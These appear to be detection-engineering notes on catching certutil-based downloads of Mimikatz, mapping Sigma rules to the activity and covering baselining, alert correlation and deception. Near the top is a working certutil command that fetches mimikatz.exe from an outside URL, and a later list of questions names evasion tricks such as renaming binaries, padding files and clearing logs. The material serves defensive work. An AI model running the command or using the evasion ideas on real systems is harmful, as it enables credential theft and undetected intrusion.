# Detection analysis

## What is under attacker control
The threat actor chose to use LOLBIN and LOLBAS as part of their tooling. The TTPs vary in terms of complexity (additional stealth) and associated detection opportunities (behavior vs signature) 
```
[ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe
```
## What did we actually look for
Rules triggered by elements under attacker control are likely to have a shorter lifetime than those based on behaviors, we need to know where we are on the Pyramid of Pain. 

### Certutil
| # | Search | ATT&CK Techniques | Notes | Dependencies 
| 5 | [net_connection_win_certutil_initiated_connection.yml](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/network_connection/net_connection_win_certutil_initiated_connection.yml#L2) | [T1105](https://attack.mitre.org/techniques/T1105) | two caracteristics under attacker control:
- the image filename ending with certutil.exe
- specific ports associated with SMB or HTTP traffic | CLI args logging in 4688, Process name (not PID) in Network event (i.e. not the windows firewall) |
| 12 | [proc_creation_win_certutil_download_file_sharing_domains.yml](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/process_creation/proc_creation_win_certutil_download_file_sharing_domains.yml) | [T1027](https://attack.mitre.org/techniques/T1027) |two caracteristics under attacker control:
- the image filename ending with certutil.exe BUT the rule also specifically looks for Original Filename data. This is very selective.
- commandline arguments looking for known domains for filesharing, assuming there is no Open redirectors in place as part of the delivery. | We've added a dependency on Sysmon due to the presence of original filename | 
| 13 | [proc_creation_win_certutil_download.yml](https://github.com/SigmaHQ/sigma/blob/6fd57da13139643c6fe3e4a23276ca6ae9a6eec7/rules/windows/process_creation/proc_creation_win_certutil_download.yml#L2) | [T1027](https://attack.mitre.org/techniques/T1027)  |two caracteristics under attacker control:
- the image filename ending with certutil.exe BUT the rule also specifically looks for Original Filename data. This is very selective.
- commandline arguments looking for HTTP specifically (not SMB) and a specific verb ('urlcache ' or 'verifyctl '). | CLI args logging in 4688 | 

### Mimikatz
| # | Search | ATT&CK Techniques | Notes | Dependencies 
| 3 | [file_event_win_hktl_mimikatz_files.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/rules/windows/file/file_event/file_event_win_hktl_mimikatz_files.yml#L4) | [T1558](https://attack.mitre.org/techniques/T1558) | File extensions, operator decisions, hardcoded behavior of an open source tool | File writes being logged (Security 4663 OR EDR hooks)|
| 21 | [sysmon_mimikatz_detection_lsass.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/deprecated/windows/sysmon_mimikatz_detection_lsass.yml#L4) | [T1003](https://attack.mitre.org/techniques/T1003) | Already has silenced normal behavior allowing services and apps, which can be tampered with| Legacy environment, Non default noisy auditing of access |
| 23 | [win_alert_mimikatz_keywords.yml](https://github.com/SigmaHQ/sigma/blob/4f4ef7a8cc077b2b54c71c598db50fe8b1f14d55/rules/windows/builtin/win_alert_mimikatz_keywords.yml#L4) | [T1003.001](https://attack.mitre.org/techniques/T1003/001), [T1003.002](https://attack.mitre.org/techniques/T1003/002), [T1003.004](https://attack.mitre.org/techniques/T1003/004), [T1003.006](https://attack.mitre.org/techniques/T1003/006) | Keywords found in CLI only, operator decisions, hardcoded behavior of an open source tool | CLI args logging in 4688, 4663 auditing |

### Why LOLBAS are so challenging
Exploit developers think in terms of "primitives" e.g. write what where<REF https://cwe.mitre.org/data/definitions/123.html>. In many environments, the use of certutil.exe is supposed to be rare. It is a so-called LOLBIN - Living Off the Land Binary, part of the bigger LOLBAS (Applications and Scripts) family <REF https://lolbas-project.github.io/>. Certutil's value its features and the fact that is signed by Microsoft and already installed. This offers one less "feature" or "capability" that the authors need to develop and embed in their toolkit to achieve their objectives. Detection opportunities for LOLBAS are multiple, and can yield some false positives as well as strong signals. 

## Now what
Consider many broader potentially overlapping detections, acting as failover for rules which may be too specific. A simple example approach would be to looking for hacking tool strings and names without specifying a field or index, and expecting false positives and effectively treating them as triggers for enrichments, rather than a final product. 
Recompiling or reproducing a subset of features of Mimikatz is notoriously sufficient to bypass many public detection rules around the tool, but not its behavior. Any credential dumper needs to interact with credential stores to be useful, be they in the Windows registry, in memory or in the Windows registry in memory. Detections of behavior are unfortunately less often found in native logs, but EDRs performing hooking of select system APIs. 

### Modernize (if needed) the way you search your data
- Get used to leverage APIs and macros for your queries 
- Script and parameterize your queries. Convert them to "tests"
- Write playbooks to run advanced scenarios and elimitate false positives - convert them to "tests"

### Embrace True Positive Benign and False positives

According to statisticians, Precision measures the accuracy of positive predictions, while recall measures the ability of the model to find all relevant instances. 
In our case, this means that we need to find the balance between detections that may be too specific and occur false negatives, and detections that may be too broad and cause attrition issues. Reducing the cost of handling a false positive alert is key to make sure your team doesn't burn out. 

The triage differenciation is the hard work you need to perform, luckily only once, as you establish the detection. It is where correlation kicks in often required to run multiple queries in parallel - ideally as a "playbook" - when reviewing events with low fidelity, effectively treating them as triggers rather than a final product. 

### Build baselines and a reusable knowledge base 
Baselining who is using what in your environment is an important step, as well as the intended use of tools and CLI args. 
As a starting example: trying to determine who is using PSEXEC and why.
 - is it to run code as system?
 - is it to run code on a remote system?
 - Can you detect usage of the legitimate, original PSExec binaries?
Later on, try and move up the pyramid:
 - What about the clones of PSEXEC (PAExec, RMMs) using the same primitives? 
 - What services get started or stopped? 
 - What user creates a service remotely using the Service Control Management API? 
As your analysts map out the environment and what is "normal" - store this information in a knowledge base. Examples can be 
- Splunk lookups
- CSV files
- text files versioned on github
- a mongodb document per system or hostname

Baselining can apply against specific types of events such as kerberos service ticket issuance. 
- Who is requesting service tickets? 
- Which principals are running services where? 
Over time, you will likely notice the need to automatically enrich events (e.g. a simple IP -> Hostname PTR DNS lookup) before normalizing data and silencing events. Over time, the amount of noise will decrease, and you will be able to lower thresholds for alerts. 

#### Baselining pseudo-algorithm
```
for 30 days
  for each endpoint "signal"
  -- run a live query to know where $signal has been ran based on EVTX
    store one entry per system identified and record last sighting
  -- run a live query to know where $signal has been ran with prefetch (last executions, some handles)
    store one entry per system identified and record last sighting
  -- run a datalake query to know where $lsignal has been ran based on collected EDR data ( hooked events, Sysmon EID 1, Security EID 4688)
    store one entry per system identified and record last sighting
day++ 
```

### Notable events and normalization
While sigma can be a great start at quickly covering common use cases, it also suffers from the same constraints as other provided detections - most people can only take the time to load entire rulesets and hope for the best, while turning off rules which are prone to false positives. The approach we would recommend is not to disable the rule but handle its results differently. In particular, Splunk ES has the concept of "Notables", which are the result of correlation of multiple events of low fidelity with a score. Once a certain score per system is reached, a notable or incident is created. This concept can be recreated with limited effort but requires a bit of organization. 
#### Example custom correlation approach in Splunk
- Create a summary index
- Identify low fidelity rules and normalize their output
- Assign a score and priority to low fidelity detection use cases
- Leverage the "collect" command to send events to the summary index
- Search the summary index based on summarized events, per system, user, or behavior.
-- for the last 1h? (taking into account the delays due to ingestion and other pipelines)
--  for the last 24h?
-- for the last 7d?
--- # of different searches per entity?
--- # of entities per search?
--- # of events per entity?

## Takeaways
However, to make some detections for complicated scenarios, you will need to turn to canaries and other early warning systems, and always assume that bypasses are possible. 
As such, consider many broader potentially overlapping detections, acting as failover for rules which may be too specific. A simple example approach would be to looking for hacking tool strings and names without specifying a field or index, and expecting false positives and effectively treating them as triggers for enrichemnts, rather than a final product. 


### Articulate a complementary deception strategy focused around relevant TTPs
A good trap needs to be laid carefully. Most approaches assume that an adversary is in your environment, and will perform reconnaissance on a system or a subnet. Post exploitation may fast forward and skip this step when adversaries have accumulated knowledge about your organization through different means (previous intrusions, OSINT, leaks - be they intentional or not). 

Assumptions from vendors about your environment once more can come short. How could they possibly know every developer diva has admin rights? Vendor based deception can often cover uncommon or esoteric scenarios, or be hard to find. Additionally, honeypots or canary systems need to be monitored, or trigger an appropriate, timely response. Someone with clear intentions has triggered a particular behavior. How long can you tolerate an adversary on a system? Do you have control around the information someone can store a standard client? What is the maximum impact you are willing to submit to, should a client be pilfered? What can an adversary find on any standard device (think SCCM domain accounts)? What valuable data is found in a browser memory? What access can be granted by stealing cookies or Primary Refresh Tokens?   




### 
- Take note of the events generated for the PID of mimikatz
- Go through the entirety of your raw data looking for the PID in relevant logs:
  - Sysmon
  - AppLocker?
  - Security EVTX
  - other logs ?

Redo the exercise focusing on different, potentially weaker signals, to trigger further analysis.
e.g. renamed binary = 5 points
e.g. file written to disk = 5 points
e.g. sensitive registry read = 10 points
e.g. privilege logon event = 10 points

## Go back to the raw event itself to identify interesting data points
Sigma converter errors can occurr - a field may change name across version. Your fleet may have different consoles reporting data into the same lake. Without going to far into SIEM operations, you need to collect certain metrics around your searches, the data they need, the data you use, and the health of the pipelines.




## Understand the limitations of vendor provided detections
Considering the number of environments an MSSP or security vendor have to support, they have to make tradeoffs impacting the sensitivity of their detection rules. While security tools get more visibility, the rules you receive will never be good enough out of the box. It is important that you obtain visibility on what is covered though, to avoid duplicated efforts. There is no value in covering service creation using a custom rule if your vendor already has one, but rules come and go. Atomic red team can really help understand and regularly verify coverage of most common, generic TTPs in terms of telemetry generated, as well as alerting behavior. 
Remember that your organizations' risk appetite is not the same as anyone else's. You have to understand what weird scripts your admins wrote ten years ago to solve that one problem one tim - and feed this "friendly intelligence" into your tools to perform baselining (more on that later). 

## Shift your focus away from what is under attacker control
- In our emulation steps, you may have noticed that multiple datapoints within a single event are under attacker control, for example artifacts tied to the delivery of malware. Filenames such as mimikatz.exe, m.exe or "Overdue invoice.pdf.exe", can be detection opportunities and make their way easily into various log files and forensic artifacts (Security EID 4688, Sysmon EID 1, Security EID 4663, MFT, MRU, Shellbags, Prefetch, Shimcache, AMCache, SRUM, ...) 
Your requirements, resources, and posturing at the time of the event control what you will be able to generate, collect, investigate, and respond to. 

## Know your response to stimuli
- A sensor mapping exercise can be valuable to understand how susceptible your detection or processes are to deception and bypasses (the concept comes from intelligence and in particular the field of deception <REF CLARK AND MITCHELL>). Going back to the pyramid of pain, these attacker controlled attributes are at the very bottom as Indicators of Compromise (IOCs). The robustness of your detections can be improved by understanding and monitoring the behaviors rather than focusing on IOCs. In practice, diving deep and trying to understand the behavior of a standard yet often obscure operating system features is time consuming and daunting. More and more EDRs make this "easier" and tools let you trace the steps taken by software during execution. Namely, x64dbg, procmon, ETWTracers, let you see in detail what a tool does, as long as it is emulated properly. <REF to x86 dbg, procmon, tracing, ETW silk, ...>

Knowing what influences your decision making and operations (stimulus -> response) can be key to determine what response actions can be automated or not without shooting yourself in the foot. Some thought provoking questions:
- what happens if someone can modify a core system component and prepend EICAR test strings to it?
- what happens if someone sends an email as the CEO? 
- what happens if someone renames explorer.exe to mimikatz.exe?
- what happens if someone renames mimikatz.exe to calc.exe?
- what happens if someone pads binary files with zeros to the point that they are too big to be inspected by AV?
- what happens if someone pads a binary file to match the MD5 of a known good file?
- what happens if someone sends emails from company.gmbh instead of company.com?
- what happens if someone expands an archive in a temporary folder and runs it from this location?
- what happens if an admin disables your EDR? 
- what happens if an admin adds an exclusion to your AV?
- what happens if an admin disables Prefetch?
- what happens if an admin clears event logs?
- what happens if an admin sets the event log files to zero?


Prevention
  Compliance driven controls - to support your hardening efforts
  - is the behavior encouraged in your organization? 
  - is the behavior expected in your organization?
  - is the behavior permitted in your organization? 

  Application control oppportunities 
  - is certutil.exe protected from tampering, even by admins? (i.e. appdata or program files)
  - is certutil.exe really the real certutil.exe? e.g. when was certutil.exe file written to disk? 

Detection
  EDR opportunities anomalies
  - is there network traffic from certutil.exe to a known system?
  - what amount of network traffic is sent or received by certutil.exe?
  - is there DNS request originating from certutil.exe?
  - what files are written to disk by certutil.exe?
  - what files are read from disk by certutil.exe?

  Weaponization against threat actors
  - could you replace certutil.exe on your clients with a canary binary generated by ChatGPT to send a webhook containing system information to your slack channel, triggering a playbook?
  - what about other lolbas? e.g. embedded curl, ftp, telnet, utilman

## Lifecycle of detections
A tedious task is the monitoring of data sources, their log feeds, and the data they hold. Scripted tests and threat emulation can help (see Atomic redteam, or Caldera) ensuring you have the data and the right process in place. However, you need to keep an inventory of the controls, their coverage, and their relevance over their lifecycle. 
Drawing from past lives, you may see a direct resemblance to software testing. Familiar approaches like unit tests and integration tests come to mind. Relying on slow moving technologies (EVTX, Applocker, audit.d, AppArmor, syslog) can help provide a fundational static layer to your detection, even if relatively basic. They're also the easiest to test as they're not at the mercy of as many venture capitalists. 

### Focus on repeatability 
For example, running and storic simple statistics per data source on a daily basis can be helpful. It is important to use the API of consoles/appliance to make your lives easier: 
- how many systems sent logs to the SIEM
- how many systems were seen active according to the management plane (use the API of consoles/appliance or inventories)
- how many events were generated and made their way to the SIEM
- how many events were generated according to the management plane (use the API of consoles/appliance or inventories)
- does the telemetry around the event change over time? Vendor generated events do have versioning which can change over time.
- what is the severity of the alert generated? Is it the same as last month? 
- does it trigger a case in your SIEM? Have field names changed since the last test? Especially valid in case you don't use Splunk, and you need to formulate queries with field=value rather than string and free-text based.

### Tips and triks
Continuous reporting on the settings of the systems can help wrap your head around this, and identify drift. Drift addressed early can be reported on before it becomes systemic, and confirm the effectiveness of detections. 
Measuring uptime can give you an indirect measure of the attitude of the admins towards patching. The age of the OS installation can give you an idea of the "cruft" that has been added overtime as admins came and went. 
The first and last event in an EVTX file can give you a sense of the activity and usage of a system.
The number of usernames found in an EVTX file can give you a sense of the value of a system for an attacker (# credentials to steal or reset...)

## Things you can modernize and influence across your organization to reduce the amount of noise, today, at other people's expense
- reliance on Windows Script hosts (bat, js, cscript, wscript, jscript, com, ...) pay a consultant to make this all powershell and benefit from logging, AMSI, and more. 
- reliance on SMB - most of the actions done over SMB are multiplexed - SMB is a transport for many operations. Shift from this protocol to SSH (ships with modern windows, or Powershell remoting). Win RS, WinRM, PSRemoting, all support modern authorization (Just Enough Admin - a constrained session with limited permissions), authorization, and logging.
- reliance on single factor only protocols (💀)
- reduce the number of privileged network based scanning tools (💀)
- tweak your audit policy to complement and or replace your EDR coverage. 

## Knowledge base(line) - take notes as you go
Baselining who is using what in your environment is an important step, as well as the intended use of tools and CLI args. Understand who is using PSEXEC - is it to run code as system? is it to run code on a remote system? What about the clones of PSEXEC using the same primitives? What services get started or stopped? What user creates a service remotely using the Service Control Management API? Who creates scheduled tasks to run immediately? This information can live in a knowledge base (gold!), sometimes as simple as a wiki page searchable, organized with keywords and if you so desire listing MITRE Att&Ck identifiers.
- Splunk lookups
- CSV files
- text files versioned on github
- a mongodb document per system or hostname
Imagine this simple pseudo-algorithm
for 30 days
  for each lolbas
  -- run a live query to know where $lolbas has been ran based on EVTX
    store one entry per system identified and record last sighting
  -- run a live query to know where $lolbas has been ran with prefetch (last executions, some handles)
    store one entry per system identified and record last sighting
  -- run a datalake query to know where $lolbas has been ran based on collected EDR data ( hooked events, Sysmon EID 1, Security EID 4688)
    store one entry per system identified and record last sighting
day++ 
Similarly, baselining can apply against specific types of events such as kerberos service ticket issuance. Who is requesting service tickets? Which principals are running services where? Over time, you will likely notice the need to automatically enrich events (e.g. a simple IP -> Hostname PTR DNS lookup) before normalizing data and silencing events. Over time, the amount of noise will decrease, and you will be able to lower thresholds for alerts. 


## Articulate a complementary deception strategy focused around relevant TTPs
A good trap needs to be laid carefully. Most approaches assume that an adversary is in your environment, and will perform reconnaissance on a system or a subnet. Post exploitation may fast forward and skip this step when adversaries have accumulated knowledge about your organization through different means (previous intrusions, OSINT, leaks - be they intentional or not). 

Assumptions from vendors about your environment once more can come short. How could they possibly know every developer diva has admin rights? Vendor based deception can often cover uncommon or esoteric scenarios, or be hard to find. Additionally, honeypots or canary systems need to be monitored, or trigger an appropriate, timely response. Someone with clear intentions has triggered a particular behavior. How long can you tolerate an adversary on a system? Do you have control around the information someone can store a standard client? What is the maximum impact you are willing to submit to, should a client be pilfered? What can an adversary find on any standard device (think SCCM domain accounts)? What valuable data is found in a browser memory? What access can be granted by stealing cookies or Primary Refresh Tokens?   

## Modernize the way you search your data
- Get used to APIs and macros. Script your queries. Convert them to "tests"
- Sigma conversions

## Links
Atomic red team
Detecntion engineering maturity matrix
Sensor mapping for deception

### Preventive Posture
- MITRE Engenuity Evaluations https://attackevals.mitre-engenuity.org
- D3FEND https://d3fend.mitre.org
- ATT&CK Mitigations https://attack.mitre.org/mitigations/enterprise/
- Mappings Explorer https://center-for-threat-informed-defense.github.io/mappings-explorer/

### Detection Posture
- MITRE CAR https://car.mitre.org
- ATT&CK DataSources https://attack.mitre.org/datasources/
- Top Techniques https://top-attack-techniques.mitre-engenuity.org/
